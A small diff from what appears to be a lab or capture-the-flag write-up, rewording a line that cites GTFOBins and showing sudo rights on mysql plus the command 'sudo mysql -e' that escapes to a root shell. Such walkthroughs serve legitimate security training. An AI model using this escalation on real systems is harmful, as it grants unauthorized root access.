@@ -102,7 +102,7 @@ User goat may run the following commands on lab-pg-ubuntu18-funboxeasyenum-243-1
     (root) NOPASSWD: /usr/bin/mysql
 ```
 
-Gained a privileged shell using `mysql` via GTFOBins:
+Used the GTFOBins reference for the sudo `mysql` binary to craft the root shell command ([GTFOBins — mysql](https://gtfobins.org/gtfobins/mysql/#shell)):
 
 ```
 goat@lab-pg-ubuntu18-funboxeasyenum-243-108:/tmp$ sudo mysql -e '\! /bin/sh'
